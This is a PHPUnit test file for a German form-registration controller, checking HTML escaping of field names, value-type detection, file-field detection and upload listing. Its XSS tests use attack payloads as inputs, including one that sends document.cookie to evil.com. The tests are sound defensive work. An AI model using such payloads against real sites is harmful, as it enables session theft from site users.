<?php
declare(strict_types=1);

namespace Tests\Unit\Controllers;

use App\Controllers\DetailController;
use App\Repositories\AnmeldungRepository;
use App\Models\Anmeldung;
use PHPUnit\Framework\TestCase;
use ReflectionClass;

/**
 * Tests for DetailController - especially XSS prevention in humanizeKey()
 */
class DetailControllerTest extends TestCase
{
    private AnmeldungRepository $mockRepository;
    private DetailController $controller;

    protected function setUp(): void
    {
        parent::setUp();

        $this->mockRepository = $this->createMock(AnmeldungRepository::class);
        $this->controller = new DetailController($this->mockRepository);
    }

    /**
     * Helper to call private humanizeKey() method via reflection
     */
    private function callHumanizeKey(string $key): string
    {
        $reflection = new ReflectionClass($this->controller);
        $method = $reflection->getMethod('humanizeKey');
        $method->setAccessible(true);

        return $method->invoke($this->controller, $key);
    }

    /**
     * Test that field names are returned as-is (for downstream tool compatibility)
     */
    public function testHumanizeKeyReturnsFieldNameAsIs(): void
    {
        // Field names should be returned unchanged (no transformation)
        $this->assertEquals('first_name', $this->callHumanizeKey('first_name'));
        $this->assertEquals('lastName', $this->callHumanizeKey('lastName'));
        $this->assertEquals('email_address', $this->callHumanizeKey('email_address'));
        $this->assertEquals('AusbHausnummer', $this->callHumanizeKey('AusbHausnummer'));
    }

    /**
     * Test that snake_case is preserved (not converted)
     */
    public function testHumanizeKeyPreservesSnakeCase(): void
    {
        $this->assertEquals('user_name', $this->callHumanizeKey('user_name'));
        $this->assertEquals('date_of_birth', $this->callHumanizeKey('date_of_birth'));
    }

    /**
     * Test that camelCase is preserved (not converted)
     */
    public function testHumanizeKeyPreservesCamelCase(): void
    {
        $this->assertEquals('firstName', $this->callHumanizeKey('firstName'));
        $this->assertEquals('lastName', $this->callHumanizeKey('lastName'));
        $this->assertEquals('emailAddress', $this->callHumanizeKey('emailAddress'));
    }

    /**
     * Test that capitalization is preserved (not forced)
     */
    public function testHumanizeKeyPreservesCapitalization(): void
    {
        $this->assertEquals('name', $this->callHumanizeKey('name'));
        $this->assertEquals('full_name', $this->callHumanizeKey('full_name'));
        $this->assertEquals('Name', $this->callHumanizeKey('Name'));
    }

    /**
     * Test XSS: Script tags are escaped
     */
    public function testHumanizeKeyEscapesScriptTags(): void
    {
        $malicious = '<script>alert("XSS")</script>';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped script tags
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('</script>', $result);

        // Should contain escaped version
        $this->assertStringContainsString('&lt;script&gt;', $result);
        $this->assertStringContainsString('&lt;/script&gt;', $result);
    }

    /**
     * Test XSS: HTML tags are escaped
     */
    public function testHumanizeKeyEscapesHtmlTags(): void
    {
        $malicious = '<img src=x onerror="alert(1)">';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped tags
        $this->assertStringNotContainsString('<img', $result);

        // Quotes should be escaped (this prevents the XSS attack)
        $this->assertStringContainsString('&quot;', $result);

        // Should contain escaped version
        $this->assertStringContainsString('&lt;img', $result);

        // Note: "onerror=" as text is not dangerous when quotes are escaped
        // The XSS is prevented by escaping HTML tags and quotes, not the attribute name
    }

    /**
     * Test XSS: Event handlers are escaped
     */
    public function testHumanizeKeyEscapesEventHandlers(): void
    {
        $malicious = 'onclick="alert(1)"';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped quotes
        $this->assertStringNotContainsString('onclick="', $result);

        // Should contain escaped quotes
        $this->assertStringContainsString('&quot;', $result);
    }

    /**
     * Test XSS: Single quotes are escaped (ENT_QUOTES)
     */
    public function testHumanizeKeyEscapesSingleQuotes(): void
    {
        $malicious = "test'onclick='alert(1)'";
        $result = $this->callHumanizeKey($malicious);

        // Single quotes should be escaped
        $this->assertStringContainsString('&#039;', $result);
        $this->assertStringNotContainsString("'onclick=", $result);
    }

    /**
     * Test XSS: Double quotes are escaped (ENT_QUOTES)
     */
    public function testHumanizeKeyEscapesDoubleQuotes(): void
    {
        $malicious = 'test"onclick="alert(1)"';
        $result = $this->callHumanizeKey($malicious);

        // Double quotes should be escaped
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringNotContainsString('"onclick="', $result);
    }

    /**
     * Test XSS: Complex attack vector
     */
    public function testHumanizeKeyEscapesComplexXssVector(): void
    {
        $malicious = '"><script>document.location="http://evil.com?cookie="+document.cookie</script>';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain any unescaped script tags (most important)
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('</script>', $result);

        // All special characters should be escaped
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringContainsString('&lt;script&gt;', $result);
        $this->assertStringContainsString('&lt;/script&gt;', $result);

        // Note: "document." itself is not dangerous when script tags are escaped
        // The XSS is prevented by escaping the HTML structure, not the JS code inside
    }

    /**
     * Test XSS: UTF-8 encoding is preserved
     *
     * Note: ucwords() doesn't capitalize non-ASCII characters like 'ü'
     * This is a known PHP limitation. For full UTF-8 support, mb_convert_case() would be needed.
     * However, for security purposes, the important thing is that UTF-8 characters are not corrupted.
     */
    public function testHumanizeKeyPreservesUtf8(): void
    {
        // German umlauts should not be corrupted (even if not capitalized)
        $result = $this->callHumanizeKey('über_name');
        $this->assertStringContainsString('über', $result); // ucwords() doesn't capitalize ü

        // Emoji should work
        $result = $this->callHumanizeKey('name_😀');
        $this->assertStringContainsString('😀', $result);
    }

    /**
     * Test XSS: NULL bytes are handled
     */
    public function testHumanizeKeyHandlesNullBytes(): void
    {
        $malicious = "test\0injection";
        $result = $this->callHumanizeKey($malicious);

        // NULL byte should not break escaping
        $this->assertIsString($result);
    }

    /**
     * Test that show() throws exception for invalid ID
     */
    public function testShowThrowsExceptionForInvalidId(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Ungültige ID');

        $this->controller->show(0);
    }

    /**
     * Test that show() throws exception when entry not found
     */
    public function testShowThrowsExceptionWhenNotFound(): void
    {
        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(999)
            ->willReturn(null);

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Eintrag nicht gefunden');

        $this->controller->show(999);
    }

    /**
     * Test that show() returns correct structure
     */
    public function testShowReturnsCorrectStructure(): void
    {
        $mockAnmeldung = new Anmeldung(
            id: 1,
            formular: 'bs',
            formularVersion: null,
            name: 'Test User',
            email: 'test@example.com',
            status: 'neu',
            data: ['field1' => 'value1'],
            createdAt: new \DateTimeImmutable(),
            updatedAt: null,
            deleted: false,
            deletedAt: null
        );

        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(1)
            ->willReturn($mockAnmeldung);

        $result = $this->controller->show(1);

        $this->assertArrayHasKey('anmeldung', $result);
        $this->assertArrayHasKey('structuredData', $result);
        $this->assertArrayHasKey('uploadedFiles', $result);

        $this->assertSame($mockAnmeldung, $result['anmeldung']);
        $this->assertIsArray($result['structuredData']);
        $this->assertIsArray($result['uploadedFiles']);
    }

    // =========================================================================
    // Reflection helpers
    // =========================================================================

    private function callDetectValueType(mixed $value, ?array $storedType = null): string
    {
        $ref = new ReflectionClass($this->controller);
        $method = $ref->getMethod('detectValueType');
        $method->setAccessible(true);
        return $method->invoke($this->controller, $value, $storedType);
    }

    private function callIsFileField(string $key, mixed $value, ?array $storedType = null): bool
    {
        $ref = new ReflectionClass($this->controller);
        $method = $ref->getMethod('isFileField');
        $method->setAccessible(true);
        return $method->invoke($this->controller, $key, $value, $storedType);
    }

    private function callFormatFileSize(int $bytes): string
    {
        $ref = new ReflectionClass($this->controller);
        $method = $ref->getMethod('formatFileSize');
        $method->setAccessible(true);
        return $method->invoke($this->controller, $bytes);
    }

    private function makeAnmeldung(int $id = 1, ?array $data = null): Anmeldung
    {
        return new Anmeldung(
            id: $id,
            formular: 'bs',
            formularVersion: null,
            name: 'Max',
            email: 'max@example.com',
            status: 'neu',
            data: $data,
            createdAt: new \DateTimeImmutable(),
            updatedAt: null,
            deleted: false,
            deletedAt: null,
        );
    }

    // =========================================================================
    // show() – edge cases
    // =========================================================================

    public function testShowThrowsExceptionForNegativeId(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Ungültige ID');

        $this->controller->show(-1);
    }

    // =========================================================================
    // structureData() – via show()
    // =========================================================================

    public function testShowReturnsEmptyStructuredDataForNullData(): void
    {
        $anmeldung = $this->makeAnmeldung(1, null);
        $this->mockRepository->method('findById')->willReturn($anmeldung);

        $result = $this->controller->show(1);

        $this->assertSame([], $result['structuredData']);
    }

    public function testShowReturnsEmptyStructuredDataForEmptyData(): void
    {
        $anmeldung = $this->makeAnmeldung(1, []);
        $this->mockRepository->method('findById')->willReturn($anmeldung);

        $result = $this->controller->show(1);

        $this->assertSame([], $result['structuredData']);
    }

    public function testStructuredDataSkipsUnderscoreFields(): void
    {
        $anmeldung = $this->makeAnmeldung(1, [
            'name'       => 'Max',
            '_fieldTypes' => ['name' => ['type' => 'text']],
            '_internal'  => 'skip',
        ]);
        $this->mockRepository->method('findById')->willReturn($anmeldung);

        $result = $this->controller->show(1);
        $keys = array_column($result['structuredData'], 'key');

        $this->assertContains('name', $keys);
        $this->assertNotContains('_fieldTypes', $keys);
        $this->assertNotContains('_internal', $keys);
    }

    public function testStructuredDataUsesFieldTypesMetadata(): void
    {
        $anmeldung = $this->makeAnmeldung(1, [
            'geburtstag' => '2000-01-15',
            '_fieldTypes' => ['geburtstag' => ['type' => 'text', 'inputType' => 'date']],
        ]);
        $this->mockRepository->method('findById')->willReturn($anmeldung);

        $result = $this->controller->show(1);

        $field = $result['structuredData'][0];
        $this->assertSame('geburtstag', $field['key']);
        $this->assertSame('date', $field['type']);
    }

    public function testStructuredDataIncludesIsFileFlag(): void
    {
        $anmeldung = $this->makeAnmeldung(1, [
            'upload'     => 'file.pdf',
            '_fieldTypes' => ['upload' => ['type' => 'file']],
        ]);
        $this->mockRepository->method('findById')->willReturn($anmeldung);

        $result = $this->controller->show(1);

        $this->assertTrue($result['structuredData'][0]['isFile']);
    }

    // =========================================================================
    // detectValueType() – storedType (SurveyJS metadata)
    // =========================================================================

    public function testDetectValueTypeUsesInputTypeDate(): void
    {
        $this->assertSame('date', $this->callDetectValueType('2024-01-01', ['inputType' => 'date']));
    }

    public function testDetectValueTypeUsesInputTypeEmail(): void
    {
        $this->assertSame('email', $this->callDetectValueType('x@y.de', ['inputType' => 'email']));
    }

    public function testDetectValueTypeUsesInputTypeUrl(): void
    {
        $this->assertSame('url', $this->callDetectValueType('https://example.com', ['inputType' => 'url']));
    }

    public function testDetectValueTypeUsesTypeBoolean(): void
    {
        $this->assertSame('boolean', $this->callDetectValueType(true, ['type' => 'boolean']));
    }

    public function testDetectValueTypeUsesTypeCheckbox(): void
    {
        $this->assertSame('array', $this->callDetectValueType(['a', 'b'], ['type' => 'checkbox']));
    }

    public function testDetectValueTypeUsesTypeTagbox(): void
    {
        $this->assertSame('array', $this->callDetectValueType(['a'], ['type' => 'tagbox']));
    }

    // =========================================================================
    // detectValueType() – heuristics (no storedType)
    // =========================================================================

    public function testDetectValueTypeArrayHeuristic(): void
    {
        $this->assertSame('array', $this->callDetectValueType(['a', 'b']));
    }

    public function testDetectValueTypeBoolHeuristic(): void
    {
        $this->assertSame('boolean', $this->callDetectValueType(true));
        $this->assertSame('boolean', $this->callDetectValueType(false));
    }

    public function testDetectValueTypeNumericHeuristic(): void
    {
        $this->assertSame('number', $this->callDetectValueType(42));
        $this->assertSame('number', $this->callDetectValueType('3.14'));
        $this->assertSame('number', $this->callDetectValueType('0'));
    }

    public function testDetectValueTypeUrlHeuristic(): void
    {
        $this->assertSame('url', $this->callDetectValueType('https://example.com'));
        $this->assertSame('url', $this->callDetectValueType('http://test.org/path'));
    }

    public function testDetectValueTypeEmailHeuristic(): void
    {
        $this->assertSame('email', $this->callDetectValueType('user@example.com'));
    }

    public function testDetectValueTypeDateHeuristic(): void
    {
        $this->assertSame('date', $this->callDetectValueType('2024-06-15'));
        $this->assertSame('date', $this->callDetectValueType('2024-01-01 12:00:00'));
    }

    public function testDetectValueTypeDefaultsToString(): void
    {
        $this->assertSame('string', $this->callDetectValueType('Hallo Welt'));
        $this->assertSame('string', $this->callDetectValueType(''));
    }

    public function testDetectValueTypeStoredTypeTakesPriorityOverHeuristics(): void
    {
        // storedType says 'date' even for a plain string value
        $result = $this->callDetectValueType('not-a-date', ['inputType' => 'date']);
        $this->assertSame('date', $result);
    }

    // =========================================================================
    // isFileField()
    // =========================================================================

    public function testIsFileFieldTrueWhenStoredTypeIsFile(): void
    {
        $this->assertTrue($this->callIsFileField('upload', 'file.pdf', ['type' => 'file']));
    }

    public function testIsFileFieldFalseWhenStoredTypeIsNotFile(): void
    {
        $this->assertFalse($this->callIsFileField('upload', 'value', ['type' => 'text']));
    }

    public function testIsFileFieldFalseForNonStringWithoutStoredType(): void
    {
        $this->assertFalse($this->callIsFileField('data', ['array' => 'value']));
        $this->assertFalse($this->callIsFileField('flag', true));
    }

    public function testIsFileFieldTrueForFileKeyword(): void
    {
        $this->assertTrue($this->callIsFileField('file_upload', 'somefile'));
        $this->assertTrue($this->callIsFileField('upload_doc', 'something'));
        $this->assertTrue($this->callIsFileField('Fotografie', 'img'));
        $this->assertTrue($this->callIsFileField('mein_bild', 'image'));
        $this->assertTrue($this->callIsFileField('document_1', 'doc'));
        $this->assertTrue($this->callIsFileField('attachment', 'file'));
        $this->assertTrue($this->callIsFileField('image_data', 'x'));
    }

    public function testIsFileFieldTrueForFileExtension(): void
    {
        $this->assertTrue($this->callIsFileField('field', 'document.pdf'));
        $this->assertTrue($this->callIsFileField('field', 'photo.jpg'));
        $this->assertTrue($this->callIsFileField('field', 'photo.jpeg'));
        $this->assertTrue($this->callIsFileField('field', 'image.PNG')); // case-insensitive
        $this->assertTrue($this->callIsFileField('field', 'report.docx'));
        $this->assertTrue($this->callIsFileField('field', 'data.xlsx'));
    }

    public function testIsFileFieldFalseForNonFileString(): void
    {
        $this->assertFalse($this->callIsFileField('name', 'Max Mustermann'));
        $this->assertFalse($this->callIsFileField('email', 'max@example.com'));
        $this->assertFalse($this->callIsFileField('status', 'neu'));
    }

    // =========================================================================
    // formatFileSize()
    // =========================================================================

    public function testFormatFileSizeBytes(): void
    {
        $this->assertSame('512 B', $this->callFormatFileSize(512));
        $this->assertSame('0 B', $this->callFormatFileSize(0));
    }

    public function testFormatFileSizeKilobytes(): void
    {
        $this->assertSame('1 KB', $this->callFormatFileSize(1024));
        $this->assertSame('1.5 KB', $this->callFormatFileSize(1536));
    }

    public function testFormatFileSizeMegabytes(): void
    {
        $this->assertSame('1 MB', $this->callFormatFileSize(1024 * 1024));
        $this->assertSame('2.5 MB', $this->callFormatFileSize((int)(2.5 * 1024 * 1024)));
    }

    public function testFormatFileSizeGigabytes(): void
    {
        $this->assertSame('1 GB', $this->callFormatFileSize(1024 * 1024 * 1024));
    }

    // =========================================================================
    // findUploadedFiles() – via show()
    // =========================================================================

    public function testShowReturnsUploadedFilesMatchingId(): void
    {
        // Resolve uploads dir relative to the source file (same as in the controller)
        $ref = new ReflectionClass(DetailController::class);
        $sourceDir = dirname($ref->getFileName());
        $uploadDir = $sourceDir . '/../../uploads';

        // Ensure uploads dir exists
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
            $createdDir = true;
        }

        // Create test files for id=42
        $testFile1 = $uploadDir . '/42_test_doc.pdf';
        $testFile2 = $uploadDir . '/42_test_image.jpg';
        file_put_contents($testFile1, 'dummy pdf content');
        file_put_contents($testFile2, 'dummy jpg content');

        try {
            $anmeldung = $this->makeAnmeldung(42, ['field' => 'value']);
            $this->mockRepository->method('findById')->willReturn($anmeldung);

            $result = $this->controller->show(42);
            $files = $result['uploadedFiles'];

            $this->assertCount(2, $files);
            $names = array_column($files, 'name');
            $this->assertContains('42_test_doc.pdf', $names);
            $this->assertContains('42_test_image.jpg', $names);

            // Check structure of a file entry
            $file = $files[0];
            $this->assertArrayHasKey('name', $file);
            $this->assertArrayHasKey('path', $file);
            $this->assertArrayHasKey('size', $file);
            $this->assertArrayHasKey('sizeFormatted', $file);
            $this->assertArrayHasKey('extension', $file);
            $this->assertArrayHasKey('downloadUrl', $file);
        } finally {
            // Cleanup
            @unlink($testFile1);
            @unlink($testFile2);
            if (!empty($createdDir)) {
                @rmdir($uploadDir);
            }
        }
    }

    public function testShowReturnsEmptyUploadedFilesWhenNoneMatch(): void
    {
        $ref = new ReflectionClass(DetailController::class);
        $sourceDir = dirname($ref->getFileName());
        $uploadDir = $sourceDir . '/../../uploads';

        // Ensure uploads dir exists but has no files for id=999
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
            $createdDir = true;
        }

        try {
            $anmeldung = $this->makeAnmeldung(999, ['field' => 'value']);
            $this->mockRepository->method('findById')->willReturn($anmeldung);

            $result = $this->controller->show(999);

            $this->assertSame([], $result['uploadedFiles']);
        } finally {
            if (!empty($createdDir)) {
                @rmdir($uploadDir);
            }
        }
    }

    /**
     * Test that structured data with XSS in field names is sanitized
     */
    public function testStructuredDataSanitizesFieldNames(): void
    {
        $mockAnmeldung = new Anmeldung(
            id: 1,
            formular: 'bs',
            formularVersion: null,
            name: 'Test User',
            email: 'test@example.com',
            status: 'neu',
            data: [
                '<script>alert("XSS")</script>' => 'malicious_key',
                'normal_field' => 'safe_value',
            ],
            createdAt: new \DateTimeImmutable(),
            updatedAt: null,
            deleted: false,
            deletedAt: null
        );

        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(1)
            ->willReturn($mockAnmeldung);

        $result = $this->controller->show(1);

        // Check that malicious key was sanitized in label
        $structuredData = $result['structuredData'];
        $this->assertCount(2, $structuredData);

        // Find the field with malicious key
        $maliciousField = null;
        foreach ($structuredData as $field) {
            if ($field['key'] === '<script>alert("XSS")</script>') {
                $maliciousField = $field;
                break;
            }
        }

        $this->assertNotNull($maliciousField);

        // Label should be escaped
        $this->assertStringNotContainsString('<script>', $maliciousField['label']);
        $this->assertStringContainsString('&lt;script&gt;', $maliciousField['label']);
    }
}
